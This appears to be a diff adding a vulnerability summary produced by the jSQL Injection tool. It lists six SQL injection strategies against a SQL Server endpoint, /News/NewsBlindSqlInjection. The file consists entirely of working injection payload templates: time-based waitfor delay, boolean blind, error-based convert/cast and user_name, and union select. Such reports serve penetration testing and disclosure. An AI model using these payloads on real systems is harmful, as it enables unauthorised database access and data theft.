@@ -1,0 +1,42 @@
+# Date: 2024-11-26 
+# Tested on: Windows 11 (v10.0) 
+# Tool: jSQL Injection v0.101 (https://github.com/ron190/jsql-injection) 
+# Database: SQL Server  
+
+## Vulnerability summary  
+
+### Strategy: Time 
+Method: GET 
+Path: /News/NewsBlindSqlInjection 
+Query: id=1222020022+;if((<query>))waitfor+delay'00:00:00'else+waitfor+delay'00:00:5'--+-kzYS 
+Header: Content-Type: text/plain  
+
+### Strategy: Blind 
+Method: GET 
+Path: /News/NewsBlindSqlInjection 
+Query: id=1222020022+or(<query>)--+-rJro 
+Header: Content-Type: text/plain  
+
+### Strategy: Error:Cast:or explicit 
+Method: GET 
+Path: /News/NewsBlindSqlInjection 
+Query: id=1222020022+or+1=convert(int,((<query>)))--+-ipdt 
+Header: Content-Type: text/plain  
+
+### Strategy: Error:Cast:or implicit 
+Method: GET 
+Path: /News/NewsBlindSqlInjection 
+Query: id=1222020022+or+1=1/((<query>))--+-WNLK 
+Header: Content-Type: text/plain  
+
+### Strategy: Error:User_name:or 
+Method: GET 
+Path: /News/NewsBlindSqlInjection 
+Query: id=1222020022+or+1=user_name(((<query>)))--+-GoVU 
+Header: Content-Type: text/plain  
+
+### Strategy: Normal 
+Method: GET 
+Path: /News/NewsBlindSqlInjection 
+Query: id=1222020022+union+select+convert(varchar,(1)),convert(varchar,((<query>)))--+-5ZrM 
+Header: Content-Type: text/plain
